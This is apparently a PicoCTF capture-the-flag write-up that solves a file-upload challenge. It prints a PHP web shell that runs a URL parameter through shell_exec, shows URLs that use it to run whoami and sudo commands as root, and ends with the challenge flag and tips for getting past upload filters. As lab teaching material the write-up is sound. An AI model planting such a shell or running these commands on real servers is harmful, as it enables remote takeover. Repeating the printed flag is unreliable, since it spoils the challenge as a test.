---
layout: post
title: n0s4n1ty 1
date: 13-05-2025
categories: [PicoCTF]
tag: [Easy CTF]
---

Welcome to DarkR7 blogs.....

# Heading

```shell
I am DarkR7...
```

# n0s4n1ty 1 CTF: File Upload Vulnerability Writeup

## 📌 Challenge Description

> The challenge presents a **file upload vulnerability** on a web application. Our goal is to exploit this vulnerability to gain access to sensitive data or execute arbitrary code on the server to retrieve the flag.

> Link: http://standard-pizzas.picoctf.net:54419/

## 🧠 Understanding the Challenge

This challenge revolves around an insecure file upload feature that allows an attacker to upload any type of file. The goal is to upload a PHP file and use it to execute commands on the server.

## 🛠️ Step-by-Step Solution

### 1. Open the Website

The website provides a file upload form that accepts all file types — including `.php`.

![Initial Site](images/2nd1.png)


![Initial Site](images/2nd2.png)

### 2. Create a Malicious PHP File

We create a simple PHP web shell that takes a command from a GET parameter and executes it.

```php
<?php
    echo shell_exec($_GET['cmd']);
?>
```

Upload this file using the site’s upload feature.

![Uploading PHP](images/2nd5.png)

### 3. Locate the Uploaded File

After uploading, we try accessing the uploaded file in a predictable upload folder like:

```
http://standard-pizzas.picoctf.net:54419/upload.php
```

We can now append commands to the URL using the `cmd` parameter, for example:

```
http://standard-pizzas.picoctf.net:54419/uploads/malicious.php?cmd=whoami
```


![Test Command Execution](images/2nd6.png)


When we enter: 

```
http://standard-pizzas.picoctf.net:54419/uploads/malicious.php?cmd=sudo -l
```

![Test Command Execution](images/2nd7.png)



This will tell us that we can run any command with any account....


Let's try as root:

To get root we need to redirect to thhis url

```
http://standard-pizzas.picoctf.net:54419/uploads/malicious.php?cmd=sudo ls /root
```

This will list all files in root..


**Here we found flag.txt in root folder...**
 

### 4. Find the Flag

Once we confirm that our PHP shell is working, we can try reading the flag file.

Try the following in your browser:

```
http://standard-pizzas.picoctf.net:54419/uploads/malicious.php?cmd=sudo cat /root/flag.txt
```

If the file exists and permissions are open, this will output the flag.

![Flag Found](images/2nd9.png)

### 5. Flag Retrieved

Success! We see the flag printed on the page.

![Final Flag](images/2nd9.png)

## 🏁 Flag

```
picoCTF{wh47_c4n_u_d0_wPHP_4043cda3}
```

## 📚 Concepts Learned

- Exploiting file upload vulnerabilities
- Bypassing file type restrictions
- Command execution through PHP
- Locating and reading sensitive files on a web server

## ✅ Tips

- Always check file type validation on upload forms
- Try uploading `.php`, `.php5`, or `.phtml` extensions
- Use predictable paths to locate uploaded files
- Append `?cmd=COMMAND` if your payload uses GET-based command injection

{% raw %}
**Payload:** `<?php echo shell_exec($_GET['cmd']); ?>`
{% endraw %}
